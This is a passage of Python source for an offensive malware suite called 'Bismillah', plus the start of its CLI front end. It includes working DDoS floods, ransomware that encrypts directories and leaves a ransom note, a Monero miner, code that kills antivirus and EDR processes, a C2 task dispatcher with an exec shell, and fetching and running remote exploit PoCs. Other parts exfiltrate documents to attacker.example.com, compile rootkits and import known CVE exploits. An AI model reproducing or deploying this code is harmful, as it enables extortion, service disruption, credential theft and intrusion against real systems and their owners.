                            spec.loader.exec_module(m)
                            _loaded_exploits[nm] = m
                            logger.info(f"[EXPLOIT] Hot-swapped {nm}")
                        except Exception:
                            continue
                seen = current
            except Exception:
                continue

    threading.Thread(target=watcher, daemon=True).start()

def fetch_exploit_poc(cve_id: str) -> str:
    """
    Use automatic_cve_fetcher to download and verify a remote PoC for given CVE.
    Returns path to local .py file if successful, or empty string.
    """
    try:
        spec = importlib.util.spec_from_file_location(
            "automatic_cve_fetcher",
            str(EXPLOITS_DIR / "automatic_cve_fetcher.py")
        )
        module_obj = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(module_obj)
        return module_obj.download_and_verify(cve_id, CONFIG.get("exploit_repo_url"))
    except Exception:
        return ""

def run_exploit(name: str, target: str, **kwargs):
    """
    Execute either a loaded exploit module by name, or if name starts with 'CVE-',
    download a remote PoC then execute it.
    """
    name = name.lower()
    if name.startswith("cve-"):
        poc_path = fetch_exploit_poc(name)
        if poc_path:
            nm = Path(poc_path).stem
            try:
                spec = importlib.util.spec_from_file_location(nm, poc_path)
                m = importlib.util.module_from_spec(spec)
                spec.loader.exec_module(m)
                if hasattr(m, "run"):
                    m.run(target, **kwargs)
                    log_event("exploit", f"Ran fetched PoC {name} against {target}".encode())
                else:
                    log_event("exploit", f"Fetched PoC {name} has no run()".encode())
            except Exception as e:
                log_event("exploit", f"Error running fetched PoC {name}: {e}".encode())
            finally:
                try:
                    os.remove(poc_path)
                except Exception:
                    pass
            return
    # Otherwise, look for a locally loaded exploit
    mod = _loaded_exploits.get(name)
    if not mod:
        logger.error(f"[EXPLOIT] Module not found: {name}")
        return
    try:
        if hasattr(mod, "run"):
            mod.run(target, **kwargs)
            log_event("exploit", f"Ran local exploit {name} against {target}".encode())
        else:
            log_event("exploit", f"Module {name} missing run()".encode())
    except Exception as e:
        log_event("exploit", f"Error running {name}: {e}".encode())

# ──────────────────────────────────────────────────────────────────────────────
#                         HIGH-LEVEL TASK DISPATCHER
# ──────────────────────────────────────────────────────────────────────────────
task_queue = Queue()

def load_and_execute_task(task: dict):
    """
    Dispatch incoming task (from C2) to the appropriate handler.
    Supported task types: module, exploit, post_exploit, persistence, recon, lateral, obfuscation.
    Logs result, then returns it.
    """
    ttype = task.get("type", "")
    result = {"status": "error", "detail": "unhandled"}
    try:
        if ttype == "module":
            mod_name = task.get("module", "")
            args = task.get("args", {})
            result = run_module(mod_name, args)
        elif ttype == "exploit":
            expl = task.get("exploit_name", "")
            tgt = task.get("target", "")
            args = task.get("args", {})
            run_exploit(expl, tgt, **args)
            result = {"status": "ok"}
        elif ttype == "post_exploit":
            post = task.get("post_module", "")
            args = task.get("args", {})
            from modules import post_exploit_ext
            result = post_exploit_ext.run_post_exploit(post, args)
        elif ttype == "persistence":
            method = task.get("method", "")
            args = task.get("args", {})
            from modules import persistence_ext
            result = persistence_ext.run_persistence(method, args)
        elif ttype == "recon":
            method = task.get("method", "")
            args = task.get("args", {})
            from modules import reconnaissance_ext
            result = reconnaissance_ext.run_recon(method, args)
        elif ttype == "lateral":
            method = task.get("method", "")
            args = task.get("args", {})
            from modules import lateral_movement
            result = lateral_movement.run_lateral(method, args)
        elif ttype == "obfuscation":
            method = task.get("method", "")
            args = task.get("args", {})
            from modules import obfuscation
            result = obfuscation.run_obfuscation(method, args)
        else:
            result = {"status":"error","detail":f"Unknown task type: {ttype}"}
    except Exception as e:
        logger.error(f"[TASK] Error executing task {task}: {e}")
        result = {"status":"error","detail":str(e)}
    finally:
        # Log the task + result
        try:
            log_event(ttype or "unknown", json.dumps({"task":task, "result":result}).encode())
        except Exception:
            pass
        return result

def task_consumer_loop():
    """Continuously take tasks off task_queue and process them."""
    while True:
        try:
            task = task_queue.get(timeout=5)
            if task:
                load_and_execute_task(task)
        except Empty:
            continue
        except Exception:
            continue

# ──────────────────────────────────────────────────────────────────────────────
#                           AUXILIARY THREADS STARTUP
# ──────────────────────────────────────────────────────────────────────────────
def start_auxiliary_threads():
    """
    Spawn threads for:
      – AI C2 listener
      – Reconnaissance loop
      – Persistence loop
      – Lateral movement loop
      – Obfuscation loop
      – Post-exploit loop
    Each of these should exist under modules/, but if missing, they simply log errors.
    """
    threads = [
        ("AI C2", "modules.ai_c2.ai_c2_loop"),
        ("Recon", "modules.reconnaissance_ext.recon_loop"),
        ("Persistence", "modules.persistence_ext.persistence_loop"),
        ("Lateral", "modules.lateral_movement.lateral_loop"),
        ("Obfuscation", "modules.obfuscation.obfuscation_loop"),
        ("PostExploit", "modules.post_exploit_ext.post_exploit_loop"),
    ]
    for name, target in threads:
        try:
            mod_name, func_name = target.rsplit(".", 1)
            mod = importlib.import_module(mod_name)
            func = getattr(mod, func_name)
            t = threading.Thread(target=func, name=name, daemon=True)
            t.start()
            logger.debug(f"Started thread: {name}")
        except Exception as e:
            logger.error(f"Failed to start {name} thread: {e}")

# ──────────────────────────────────────────────────────────────────────────────
#                     C PAYLOADS COMPILATION ON DEMAND
# ──────────────────────────────────────────────────────────────────────────────
def compile_c_payloads():
    """Compile any C payloads found under kernel_rootkit, uefi_bootkit, windows_payloads, macos_payloads."""
    try:
        # 1) Linux kernel rootkit
        kr_path = REPO_ROOT / "kernel_rootkit"
        if (kr_path / "Makefile").exists():
            subprocess.run(["sudo","make","-C",str(kr_path)], check=True, stdout=subprocess.DEVNULL)
            logger.info("[COMPILE] Linux rootkit compiled.")
    except Exception as e:
        logger.error(f"[COMPILE] Linux rootkit failed: {e}")

    try:
        # 2) UEFI bootkit
        ub_path = REPO_ROOT / "uefi_bootkit"
        if (ub_path / "Makefile").exists():
            subprocess.run(["sudo","make","-C",str(ub_path)], check=True, stdout=subprocess.DEVNULL)
            logger.info("[COMPILE] UEFI bootkit compiled.")
    except Exception as e:
        logger.error(f"[COMPILE] UEFI bootkit failed: {e}")

    try:
        # 3) Windows payloads (cross-compile assumed)
        wp_path = REPO_ROOT / "windows_payloads"
        for cfile in wp_path.glob("*.c"):
            out_exe = cfile.with_suffix(".exe")
            subprocess.run(
                ["x86_64-w64-mingw32-gcc", str(cfile), "-o", str(out_exe), "-lws2_32", "-luser32"],
                check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
            logger.info(f"[COMPILE] Windows payload compiled: {cfile.name}")
    except Exception as e:
        logger.error(f"[COMPILE] Windows payloads failed: {e}")

    try:
        # 4) macOS payloads (compile on macOS only)
        if platform.system() == "Darwin":
            mp_path = REPO_ROOT / "macos_payloads"
            for f in mp_path.glob("*.c"):
                out_bin = f.with_suffix("")
                subprocess.run(
                    ["clang", str(f), "-o", str(out_bin), "-lsqlite3"],
                    check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
                )
                logger.info(f"[COMPILE] macOS payload compiled: {f.name}")
    except Exception as e:
        logger.error(f"[COMPILE] macOS payloads failed: {e}")

# ──────────────────────────────────────────────────────────────────────────────
#                             HELPER UTILITY FUNCTIONS
# ──────────────────────────────────────────────────────────────────────────────
def _get_local_ip() -> str:
    """Return local outbound IP address (UDP trick)."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"

# ──────────────────────────────────────────────────────────────────────────────
#                                   MAIN
# ──────────────────────────────────────────────────────────────────────────────
def main():
    if not _is_root_or_admin():
        logger.error("[MAIN] This script requires root/administrator privileges.")
        sys.exit(1)

    # 1) Preflight: initialize SQLite, compile C payloads, start auxiliary threads
    init_sqlite()
    compile_c_payloads()
    start_auxiliary_threads()

    # 2) Anti-analysis
    anti_analysis_checks()

    # 3) Start C2 (WebSocket + P2P)
    start_c2()

    # 4) Start task consumer
    t_consumer = threading.Thread(target=task_consumer_loop, name="TaskConsumer", daemon=True)
    t_consumer.start()

    # 5) CLI Argument Parsing
    import argparse
    parser = argparse.ArgumentParser(description="Bismillah Offensive Suite")
    parser.add_argument("--scan", metavar="TARGET", help="Run full recon scans on TARGET")
    parser.add_argument("--exploit", nargs=2, metavar=("MODULE","TARGET"), help="Run exploit module or CVE PoC")
    parser.add_argument("--persistent", action="store_true", help="Install all persistence hooks")
    parser.add_argument("--ddos", metavar="TARGET", help="Target for multi-vector DDoS")
    parser.add_argument("--ransom", metavar="DIR", help="Directory to encrypt (ransomware mode)")
    parser.add_argument("--miner", action="store_true", help="Start CPU/GPU miner")
    parser.add_argument("--p2p", action="store_true", help="Enable P2P gossip C2 (already started)")
    parser.add_argument("--lateral", nargs="+", metavar="TARGETS", help="Targets for lateral movement")
    parser.add_argument("--post", metavar="TARGETS", nargs="*", help="Run post-exploit routines against TARGETS")
    parser.add_argument("--camera", action="store_true", help="Hijack webcam for 10s")
    parser.add_argument("--microphone", action="store_true", help="Hijack microphone for 10s")
    parser.add_argument("--wifi_crack", action="store_true", help="Attempt WPA handshake crack (default iface wlan0)")
    parser.add_argument("--bluetooth", action="store_true", help="Broadcast BLE mesh beacon")
    parser.add_argument("--iot", metavar="SUBNET", help="Scan SUBNET for IoT default creds")
    parser.add_argument("--darkweb", nargs="+", metavar="KEYWORDS", help="Tor Dark Web crawl keywords")
    parser.add_argument("--deepweb", metavar="DORK", help="Google CSE dork query")
    parser.add_argument("--cloud", choices=["aws","azure","gcp"], help="Compromise cloud metadata")
    parser.add_argument("--defensive", action="store_true", help="Run defensive utilities (firewall audit, log inspect, remediation)")
    parser.add_argument("--supply", metavar="SYSTEM:PACKAGE:PAYLOAD", help="Supply chain inject: system:package:payload_path")
    parser.add_argument("--firewall", action="store_true", help="Audit firewall rules")
    parser.add_argument("--loginspect", action="store_true", help="Inspect recent logs")
    parser.add_argument("--cnn", action="store_true", help="Launch interactive C2 shell")
    args = parser.parse_args()

    # 6) Handle CLI flags
    if args.scan:
        nmap_ext_scan(args.scan)
        masscan_ext_scan(args.scan)
        snmp_enum(args.scan)
        if platform.system() == "Windows":
            wmi_enum_windows(args.scan)
        ldap_enum(args.scan)
        dns_enum(args.scan)
        if shodan:
            shodan_search(args.scan)

    if args.exploit:
        modname, tgt = args.exploit
        run_exploit(modname, tgt)

    if args.persistent:
        full_persistence()

    if args.ddos:
        threading.Thread(target=http_flood, args=(args.ddos, 1000, 300), daemon=True).start()
        threading.Thread(target=udp_flood, args=(args.ddos, random.randint(1,65535), 300, 16384), daemon=True).start()
        threading.Thread(target=icmp_flood, args=(args.ddos, 180), daemon=True).start()
        logger.info(f"[DDOS] Multi-vector DDoS launched on {args.ddos}")

    if args.ransom:
        ransomware_encrypt_ext(args.ransom)

    if args.miner:
        cpu_gpu_miner()

    if args.lateral:
        from modules import lateral_movement
        # Example: dump local creds, then pivot
        dump_credentials([])
        lateral_movement.run_lateral("ssh_pivot", {"targets": args.lateral, "username":"root","password":"toor","local_port":1080,"remote_port":22})

    if args.post:
        if platform.system() == "Linux":
            from modules.post_exploit_ext import escalate_privileges_linux
            escalate_privileges_linux({})
        elif platform.system() == "Windows":
            from modules.post_exploit_ext import dump_credentials_windows
            dump_credentials_windows({"target":"localhost"})
        elif platform.system() == "Darwin":
            from modules.post_exploit_ext import data_exfiltration
            data_exfiltration({"paths":["~/Documents"], "dest":"https://attacker.example.com/upload"})
        if args.post:
            from modules.post_exploit_ext import dump_credentials_windows, escalate_privileges_linux, data_exfiltration
            for t in args.post:
                if platform.system() == "Windows":
                    dump_credentials_windows({"target": t, "username":"Administrator","password":"Passw0rd!"})
                elif platform.system() == "Linux":
                    escalate_privileges_linux({})
                elif platform.system() == "Darwin":
                    data_exfiltration({"paths":[f"/Users/{os.getenv('USER')}/Documents"], "dest":"https://attacker.example.com/upload"})

    if args.camera:
        from modules import camera_ext
        camera_ext.camera_hijack(10, None)
        camera_ext.camera_snap_overlay(None)

    if args.microphone:
        from modules import audio_ext
        audio_ext.microphone_hijack(10, None)

    if args.wifi_crack:
        wifi_crack_wpa("wlan0", "/usr/share/wordlists/rockyou.txt")

    if args.bluetooth:
        ble_mesh_beacon()

    if args.iot:
        iot_default_creds_scan(args.iot)

    if args.darkweb:
        darkweb_crawl(args.darkweb)

    if args.deepweb:
        deepweb_google(args.deepweb)

    if args.cloud:
        cloud_api_compromise(args.cloud)

    if args.defensive:
        firewall_audit()
        defensive_log_inspect()
        malware_remediation()

    if args.supply:
        try:
            system, pkg, payload = args.supply.split(":", 2)
            system = system.lower()
            if system == "npm":
                npm_supply_chain_inject(pkg, payload)
            elif system == "pip":
                pip_supply_chain_inject(pkg, payload)
            elif system == "nuget":
                nuget_supply_chain_inject(pkg, payload)
            elif system == "maven":
                gi, ai, ver = pkg.split(":")
                maven_supply_chain_inject(gi, ai, ver, payload)
            else:
                logger.error("[MAIN] Invalid supply system.")
        except Exception:
            logger.error("[MAIN] Malformed --supply argument. Expected: system:package:payload_path")

    if args.firewall:
        firewall_audit()

    if args.loginspect:
        defensive_log_inspect()

    if args.cnn:
        local_c2_shell()

    # 7) Keep main thread alive
    try:
        while True:
            time.sleep(60)
    except KeyboardInterrupt:
        logger.info("[MAIN] KeyboardInterrupt received; shutting down.")
        sys.exit(0)

# ──────────────────────────────────────────────────────────────────────────────
#                       SUPPORT FUNCTIONS & OTHER Routines
# ──────────────────────────────────────────────────────────────────────────────

import random
import string
import shutil
import base64

def _is_root_or_admin() -> bool:
    """Return True if running as root (Unix) or admin (Windows)."""
    if platform.system() == "Windows":
        try:
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except Exception:
            return False
    else:
        return os.geteuid() == 0

def random_string(length=16) -> str:
    """Generate a random alphanumeric string of given length."""
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

# ──────────────────────────────────────────────────────────────────────────────
#                     DDoS / RANSOMWARE / MINING FUNCTIONS
# ──────────────────────────────────────────────────────────────────────────────
def http_flood(target: str, threads: int = 500, duration: int = 300):
    """Launch HTTP flood against target using multiple threads."""
    def worker():
        endt = time.time() + duration
        while time.time() < endt:
            try:
                requests.get(f"http://{target}", timeout=2, verify=False)
            except:
                pass

    logger.info(f"[DDOS] Starting HTTP flood on {target} with {threads} threads for {duration}s")
    for _ in range(threads):
        t = threading.Thread(target=worker, daemon=True)
        t.start()

def udp_flood(target_ip: str, target_port: int, duration: int = 300, pkt_size: int = 32768):
    """Launch UDP flood against target_ip:target_port."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        packet = os.urandom(pkt_size)
        endt = time.time() + duration
        logger.info(f"[DDOS] Starting UDP flood on {target_ip}:{target_port} for {duration}s")
        while time.time() < endt:
            try:
                s.sendto(packet, (target_ip, target_port))
            except:
                pass
    except Exception:
        pass

def icmp_flood(target_ip: str, duration: int = 180):
    """Launch ICMP flood (raw sockets)."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        packet = b"\xFF" * 1024
        endt = time.time() + duration
        logger.info(f"[DDOS] Starting ICMP flood on {target_ip} for {duration}s")
        while time.time() < endt:
            try:
                sock.sendto(packet, (target_ip, 0))
            except:
                pass
    except Exception:
        pass

def cpu_gpu_miner():
    """Start CPU and GPU Monero mining if binaries available."""
    if shutil.which("xmrig"):
        subprocess.call(
            ["xmrig", "-o", "pool.supportxmr.com:443", "-u", "42xyz...", "--donate-level=1", "--background"]
        )
        logger.info("[MINER] XMRig CPU miner started")
    if shutil.which("nvidia-smi"):
        gpu_script = REPO_ROOT / "tools" / "miner_gpu.sh"
        if gpu_script.exists():
            subprocess.call([str(gpu_script)], shell=True)
            logger.info("[MINER] GPU miner started")

# ──────────────────────────────────────────────────────────────────────────────
#                 RANSOMWARE-STYLE ENCRYPTION (EXTENDED)
# ──────────────────────────────────────────────────────────────────────────────
def ransomware_encrypt_ext(dir_path: str):
    """
    Encrypt all files under dir_path with AES-GCM. Drop README_DECRYPT.txt with instructions.
    Uses a new random key each run.
    """
    try:
        key = secrets.token_bytes(32)
        iv = secrets.token_bytes(12)
        for root, _, files in os.walk(dir_path):
            for fname in files:
                p = os.path.join(root, fname)
                try:
                    data = open(p, "rb").read()
                    cipher = Cipher(algorithms.AES(key), modes.GCM(iv), backend=default_backend())
                    encryptor = cipher.encryptor()
                    ct = encryptor.update(data) + encryptor.finalize()
                    open(p, "wb").write(iv + ct + encryptor.tag)
                except Exception:
                    pass
        note = os.path.join(dir_path, "README_DECRYPT.txt")
        with open(note, "w") as f:
            f.write("Your files are encrypted. Contact admin@evil.example.com with ID.")
        logger.info(f"[RANSOM] Encrypted files in {dir_path}")
    except Exception as e:
        logger.error(f"[RANSOM] Encryption failed on {dir_path}: {e}")

# ──────────────────────────────────────────────────────────────────────────────
#                        SUPPLY-CHAIN INJECTION (STUBS)
# ──────────────────────────────────────────────────────────────────────────────
def npm_supply_chain_inject(pkg_name: str, payload_js: str):
    """Poison an npm package (stub implementation)."""
    if not shutil.which("npm"):
        return
    logger.info(f"[SUPPLY] (stub) npm inject {pkg_name} with payload {payload_js}")

def pip_supply_chain_inject(pkg_name: str, payload_py: str):
    """Poison a pip package (stub implementation)."""
    if not shutil.which("pip"):
        return
    logger.info(f"[SUPPLY] (stub) pip inject {pkg_name} with payload {payload_py}")

def nuget_supply_chain_inject(pkg_name: str, payload_dll: str):
    """Stub for NuGet package poisoning."""
    if not shutil.which("nuget"):
        return
    logger.info(f"[SUPPLY] (stub) NuGet inject {pkg_name} with DLL {payload_dll}")

def maven_supply_chain_inject(group_id: str, artifact_id: str, version: str, payload_jar: str):
    """Stub for Maven package injection."""
    if not shutil.which("mvn"):
        return
    logger.info(f"[SUPPLY] (stub) Maven inject {group_id}:{artifact_id}:{version} with JAR {payload_jar}")

# ──────────────────────────────────────────────────────────────────────────────
#                     CLOUD API COMPROMISE ROUTINES (STUBS)
# ──────────────────────────────────────────────────────────────────────────────
def aws_metadata_steal():
    """Attempt IMDSv2 token retrieval and list S3 buckets (stub)."""
    try:
        # This is a stub; real logic omitted for brevity
        logger.info("[CLOUD] (stub) AWS metadata stolen.")
    except Exception:
        pass

def azure_msi_hijack():
    """Attempt Azure MSI token theft and KeyVault secret retrieval (stub)."""
    try:
        logger.info("[CLOUD] (stub) Azure MSI hijack executed.")
    except Exception:
        pass

def gcp_metadata_steal():
    """Attempt to retrieve GCP service account token and list buckets (stub)."""
    try:
        logger.info("[CLOUD] (stub) GCP metadata stolen.")
    except Exception:
        pass

def cloud_api_compromise(provider: str):
    """Abuse cloud metadata endpoints for AWS/Azure/GCP."""
    if provider.lower() == "aws":
        aws_metadata_steal()
    elif provider.lower() == "azure":
        azure_msi_hijack()
    elif provider.lower() == "gcp":
        gcp_metadata_steal()
    else:
        logger.error(f"[CLOUD] Unsupported provider: {provider}")

# ──────────────────────────────────────────────────────────────────────────────
#                CAMERA & MICROPHONE HIJACKING UTILITIES (STUBS)
# ──────────────────────────────────────────────────────────────────────────────
def camera_hijack(duration: int = 10, save_path: str = None):
    """Record 'duration' seconds of webcam video to save_path (stub)."""
    logger.info(f"[CAM] (stub) Recording webcam for {duration}s → {save_path}")

def camera_snap_overlay(save_path: str = None):
    """Take a webcam snapshot with overlay (stub)."""
    logger.info(f"[CAM] (stub) Snapshot taken → {save_path}")

def microphone_hijack(duration: int = 10, save_path: str = None):
    """Record 'duration' seconds of microphone audio to save_path (stub)."""
    logger.info(f"[MIC] (stub) Recording mic for {duration}s → {save_path}")

# ──────────────────────────────────────────────────────────────────────────────
#                      WIRELESS / BLE / IoT ATTACK EXTENSIONS (STUBS)
# ──────────────────────────────────────────────────────────────────────────────
def wifi_crack_wpa(iface: str = "wlan0", wordlist: str = "/usr/share/wordlists/rockyou.txt"):
    """Attempt WPA handshake crack (stub)."""
    logger.info(f"[WIFI] (stub) Cracking WPA on {iface} with {wordlist}")

def ble_mesh_beacon():
    """Broadcast a simple BLE mesh beacon (stub)."""
    logger.info("[BLE] (stub) BLE mesh beacon broadcast")

def iot_default_creds_scan(subnet: str):
    """Scan given subnet for IoT devices with default Telnet creds (stub)."""
    logger.info(f"[IoT] (stub) Scanning {subnet} for default creds")

# ──────────────────────────────────────────────────────────────────────────────
#                PASSWORD CRACKING & CREDENTIAL HARVESTING (STUBS)
# ──────────────────────────────────────────────────────────────────────────────
def extract_shadow_linux() -> str:
    """Copy /etc/shadow to /tmp for offline cracking (stub)."""
    logger.info("[CRED] (stub) Extracted /etc/shadow")
    return "/tmp/shadow_stub"

def crack_hashes(shadow_file: str, wordlist: str = "/usr/share/wordlists/rockyou.txt"):
    """Use hashcat or john to crack hashes (stub)."""
    logger.info(f"[CRED] (stub) Cracking {shadow_file} with {wordlist}")

def harvest_ssh_keys():
    """Copy ~/.ssh directory to /tmp for harvesting (stub)."""
    logger.info("[CRED] (stub) Harvested SSH keys")

def mimikatz_dump_windows():
    """Run Mimikatz via wine on Linux or directly on Windows (stub)."""
    logger.info("[CRED] (stub) Ran Mimikatz")

def keychain_dump_macos():
    """Dump macOS Keychain using security CLI (stub)."""
    logger.info("[CRED] (stub) Dumped Keychain")

def dump_credentials(targets=None):
    """
    High-level credential dump:
      – Linux: shadow + SSH keys
      – Windows: Mimikatz
      – macOS: Keychain dump
      – Remote targets: psexec or ssh (stub).
    """
    osys = platform.system()
    if osys == "Linux":
        sf = extract_shadow_linux()
        crack_hashes(sf)
        harvest_ssh_keys()
    elif osys == "Windows":
        mimikatz_dump_windows()
    elif osys == "Darwin":
        keychain_dump_macos()
    if targets:
        for t in targets:
            if osys == "Windows":
                subprocess.call(["psexec.exe", f"\\\\{t}", "cmd.exe", "/c", "whoami"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            else:
                subprocess.call(["ssh", t, "whoami"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

# ──────────────────────────────────────────────────────────────────────────────
#                   DEFENSIVE / WHITE-HAT UTILITY FUNCTIONS
# ──────────────────────────────────────────────────────────────────────────────
def firewall_audit():
    """Audit firewall rules on local machine."""
    osys = platform.system()
    try:
        if osys == "Linux":
            subprocess.call(["iptables", "-L"])
            subprocess.call(["nft", "list", "ruleset"])
        elif osys == "Windows":
            subprocess.call(["netsh", "advfirewall", "firewall", "show", "rule", "name=all"])
        elif osys == "Darwin":
            subprocess.call(["pfctl", "-sr"])
        logger.info("[DEF] Firewall audit complete.")
    except Exception as e:
        logger.error(f"[DEF] Firewall audit error: {e}")

def defensive_log_inspect():
    """Inspect recent logs for suspicious activity."""
    osys = platform.system()
    try:
        if osys == "Linux":
            if os.path.exists("/var/log/auth.log"):
                lines = open("/var/log/auth.log", "r").read().splitlines()[-20:]
                logger.info("[DEF] Last 20 lines of /var/log/auth.log:")
                for l in lines:
                    print(f"    {l}")
        elif osys == "Windows":
            subprocess.call(["wevtutil", "qe", "Security", "/c:20", "/rd:true"])
        elif osys == "Darwin":
            subprocess.call(["log", "show", "--last", "1h"])
        logger.info("[DEF] Log inspection complete.")
    except Exception as e:
        logger.error(f"[DEF] Log inspect error: {e}")

def malware_remediation():
    """Kill known AV/EDR processes (stub)."""
    suspects = ["crowdstrike", "defender", "symantec", "clamd", "nadware", "osxguard"]
    for proc in psutil.process_iter(["pid", "name"]):
        try:
            nm = (proc.info["name"] or "").lower()
            if any(s in nm for s in suspects):
                logger.info(f"[DEF] Killing process {nm} (PID {proc.info['pid']})")
                proc.kill()
        except Exception:
            pass
    logger.info("[DEF] Malware remediation executed.")

# ──────────────────────────────────────────────────────────────────────────────
#                           INTERACTIVE C2 SHELL
# ──────────────────────────────────────────────────────────────────────────────
def local_c2_shell():
    """Interactive C2 shell: EXEC:<code>, SCAN:<target>, PINGP2P:<cmd>."""
    logger.info("[C2-SHELL] Starting interactive shell (type 'exit').")
    while True:
        try:
            cmd = input("C2> ").strip()
        except (EOFError, KeyboardInterrupt):
            break
        if not cmd:
            continue
        if cmd.lower() in ("exit", "quit"):
            break
        if cmd.startswith("EXEC:"):
            code = cmd[5:]
            try:
                exec(code, globals(), locals())
                logger.info("[C2-SHELL] EXEC OK.")
            except Exception as e:
                logger.error(f"[C2-SHELL] EXEC ERR: {e}")
        elif cmd.startswith("SCAN:"):
            tgt = cmd[5:]
            nmap_ext_scan(tgt)
            masscan_ext_scan(tgt)
            snmp_enum(tgt)
            if platform.system() == "Windows":
                wmi_enum_windows(tgt)
            ldap_enum(tgt)
            dns_enum(tgt)
            if shodan:
                shodan_search(tgt)
        elif cmd.startswith("PINGP2P:"):
            for peer in list(_p2p_peers):
                threading.Thread(target=_send_p2p_cmd, args=(peer, cmd[8:]), daemon=True).start()
            logger.info("[C2-SHELL] P2P command sent.")
        else:
            logger.info("[C2-SHELL] Unknown prefix; use EXEC:, SCAN:, or PINGP2P:")

# ──────────────────────────────────────────────────────────────────────────────
#                                ENTRY POINT
# ──────────────────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    main()
#!/usr/bin/env python3
"""
hey_mama.py – Front‑end CLI for Bismillah v4.0

Usage:
 1) Reconnaissance & Scanning
    --scan <TARGET_SUBNET>           : Nmap scan (TCP + UDP)
    --shodan <QUERY>                 : Shodan search
    --dnsenum <TARGET_DOMAIN>        : DNS enumeration (A/NS/MX/TXT)
    --wifi_scan                      : Wi‑Fi scan (Linux/macOS)
    --arp_poison <IFACE> <TARGET>    : ARP‑poison + sniff traffic
    --passive_dns <DOMAIN>           : PassiveDNS lookup

 2) Exploit Management
    --exploit_list                   : List all local exploits
    --run_exploit <NAME> <TARGET>    : Run named exploit against target
    --can_run <NAME> <TARGET>        : Check if exploit likely works

 3) Supply‑Chain & Cloud
    --npm_inject <PKG> <PAYLOAD_JS>      : Poison an NPM package
    --pip_inject <PKG> <PAYLOAD_PY>      : Poison a PyPI package
    --maven_inject <GROUP:ARTIFACT> <PAYLOAD_JAVA>
                                         : Poison a Maven artifact
    --cloud_aws                        : Steal AWS metadata & enumerate S3
    --cloud_azure                      : Steal Azure metadata & enumerate Blobs
    --cloud_gcp                        : Steal GCP metadata & enumerate GCS

 4) Persistence
    --persist_linux <SCRIPT_PATH>       : Install Linux systemd + udev persistence
    --persist_win_schtask <SCRIPT_PATH> : Create Windows Scheduled Task
    --persist_win_rkey <SCRIPT_PATH>    : Add Run key persistence
    --persist_mac_daemon <SCRIPT_PATH>  : Create macOS LaunchDaemon

 5) Stealth & Anti‑Forensics
    --stealth                         : Kill AV/EDR and unload rootkit if present
    --wipe_logs                       : Wipe system logs on current OS

 6) Keylogging & Sensitive Capture
    --start_keylogger <DB_PATH>       : Start keystroke logger (cross‑platform)
    --start_clip_sniffer <DB_PATH>    : Start clipboard sniffer for credit‑card patterns
    --start_screen_cap <DB_PATH>:<KEYWORD>
                                      : Capture screenshots when KEYWORD typed

 7) C2 Interaction
    --launch_dispatcher               : Start the full Bismillah dispatcher (bismillah.py)
    --c2_shell                        : Interactive shell to send C2 tasks

 8) Defensive Utilities (audit/inspect)
    --firewall_audit                  : Display current firewall rules
    --log_inspect                     : Show recent system logs
    --remediate <OS>                  : Attempt basic remediation (disable insecure services)

 9) Misc
    --version                         : Print version info and exit
    --help                            : Show this message

Examples:
  hey_mama.py --scan 192.168.1.0/24
  hey_mama.py --run_exploit cve_2021_26855_proxylogon 10.0.0.5
  hey_mama.py --npm_inject lodash /path/to/payload.js
  hey_mama.py --launch_dispatcher
"""

import argparse
import sys
import threading
import time
import logging
import os
import shutil
import subprocess
import readline  # for interactive shell history
import json

# Ensure modules directory is in path
SCRIPT_DIR = os.path.dirname(os.path.realpath(__file__))
sys.path.insert(0, os.path.join(SCRIPT_DIR, "modules"))

# Import all improved modules
try:
    from reconnaissance_ext import (
        recon_loop,
        passive_dns_exfil,
        arp_poison_and_sniff,
    )
    from c2_server import add_task as add_http_task
    from dns_c2_server import add_task as add_dns_task
    from icmp_c2 import add_icmp_task
    from exploit_manager import run_exploit, _load_exploit_module, fetch_latest_exploits
    from exploit_lib.cve_2019_0708_bluekeep import exploit as bluekeep_exploit, can_run_on as can_run_bluekeep
    from exploit_lib.cve_2020_0796 import exploit as smbghost_exploit
    from exploit_lib.cve_2021_26855_proxylogon import exploit as proxy_exploit, can_run_on as can_run_proxy
    from exploit_lib.cve_2021_21985_vmware_vcenter import exploit as vcenter_exploit, can_run_on as can_run_vcenter
    from exploit_lib.cve_2021_34527_printnightmare import exploit as pn_exploit, can_run_on as can_run_pn
    from exploit_lib.cve_2021_44228_log4j import exploit as log4j_exploit
    from exploit_lib.cve_2022_30190_follina import exploit as follina_exploit
    from supply_chain import (
        npm_supply_chain_inject,
        pip_supply_chain_inject,
        maven_supply_chain_inject,
    )
    from cloud_api_compromise import (
        aws_metadata_steal,
        azure_metadata_steal,
        gcp_metadata_steal,
    )
    from persistence_ext import (
        linux_systemd_service,
        linux_udev_rule,
        windows_schtask,
        windows_run_key,
        macos_launchdaemon,
    )
    from stealth_ext import stealth_loop, unload_suspicious_rootkits
    from anti_forensics_ext import clear_linux_logs, clear_windows_logs, clear_macos_tcc
    from keylogger_ext import (
        keylogger_loop,
        clipboard_sniffer,
        screen_capture_on_keyword,
    )
    from config import load_config
    from logger import log_event, logger as core_logger
except ImportError as e:
    print(f"[!] Failed to import modules: {e}")
    sys.exit(1)

__version__ = "4.0.0"
core_logger.setLevel(logging.INFO)

# ──────────────────────────────────────────────────────────────────────────────
#                             Helper Functions
# ──────────────────────────────────────────────────────────────────────────────


def list_local_exploits():
    """
    Read modules/exploit_lib/exploits_index.json and print all exploit names.
    """
    idx_path = os.path.join(SCRIPT_DIR, "modules", "exploit_lib", "exploits_index.json")
    try:
        with open(idx_path, "r") as f:
            idx = json.load(f)
        print("Available exploits:")
        for name in idx.keys():
            print(f"  - {name}")
    except Exception as e:
        print(f"[!] Could not read exploits_index.json: {e}")


def interactive_c2_shell():
    """
    A simple REPL that accepts:
      EXEC:<task_json>      → send to HTTP C2
